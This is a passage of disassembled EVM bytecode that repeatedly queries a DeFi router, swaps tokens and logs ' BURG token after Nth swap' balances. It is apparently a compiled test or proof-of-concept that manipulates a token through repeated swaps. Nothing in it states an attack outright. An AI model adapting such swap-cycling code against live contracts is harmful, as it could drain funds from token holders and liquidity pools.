RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0xA30 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0xA54 JUMPI PUSH2 0xA54 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0xAB7 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722033726420737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xB15 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xB39 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xB46 SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0xB82 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0xBB5 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xBD2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0xBFA SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0xC1E JUMPI PUSH2 0xC1E PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0xC81 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722034746820737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xCDF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xD03 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xD10 SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0xD4C PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0xD7F SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xD9C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0xDC4 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0xDE8 JUMPI PUSH2 0xDE8 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0xE4B SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722035746820737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xEA9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xECD SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xEDA SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0xF16 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0xF49 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xF66 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0xF8E SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0xFB2 JUMPI PUSH2 0xFB2 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0x1015 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722036746820737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1073 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1097 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x10A4 SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x10E0 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1113 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1130 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1158 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x117C JUMPI PUSH2 0x117C PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0x11DF SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722037746820737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x123D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1261 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x126E SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x12AA PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x12DD SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x12FA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x1322 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP2 SWAP3 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x137D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x13A1 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x13AE SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x13D8 JUMPI PUSH2 0x13D8 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0x143B SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722038746820737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x1477 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x14AA SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x14C7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x14EF SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x1525 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1558 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1575 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x159D SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x15D3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x1606 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1623 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x164B SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x1681 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x16B4 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x16D1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x16F9 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH2 0x172F PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 